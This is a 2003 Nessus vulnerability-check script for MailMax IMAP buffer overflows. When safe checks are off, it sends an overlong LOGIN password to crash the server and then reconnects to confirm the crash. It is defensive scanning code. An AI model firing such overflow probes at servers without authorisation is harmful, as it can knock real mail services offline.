#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(11598);
 script_bugtraq_id(7326);
 script_cve_id("CVE-1999-0404");
 script_version ("$Revision: 1.4 $");

 
 name["english"] = "MailMax IMAP overflows";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of the MailMax 
IMAP server which is vulnerable to various overflows
which may allow to execute arbitrary commands on this
host or to disable it remotely.

Solution : Upgrade to MailMax 5.0.10.8 or newer
Risk Factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Overflows the remote IMAP server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv_line(socket:soc, length:4096);
  if(safe_checks())
  {
   if(egrep(pattern:"MailMax [1-5][^0-9]", string:r))
   {
    report = "
The remote host is running a version of the MailMax 
IMAP server which is vulnerable to various overflows
which may allow to execute arbitrary commands on this
host or to disable it remotely.

*** Since safe_checks are enabled, Nessus did not actually
*** check for this flaw but relied on the banner instead.
*** This might be a false positive.

Solution : Upgrade to MailMax 5.0.10.8 or newer
Risk Factor : High";    
  security_hole(data:report, port:port);
   }
    exit(0);
  }
  send(socket:soc, data:string("0000 CAPABILITY\r\n"));
  r = recv_line(socket:soc, length:4096);
  r = recv_line(socket:soc, length:4096);
  send(socket:soc, data:'0001 LOGIN "nobody@example.com" "'+crap(50)+'\r\n');
 
  r = recv_line(socket:soc, length:4096);
  r = recv_line(socket:soc, length:4096);
  close(soc);
  
  soc = open_sock_tcp(port);
  if(!soc){security_hole(port); exit(0);}
  r = recv_line(socket:soc, length:4096);
  if(!r)security_hole(port);
  close(soc);  
 }
}
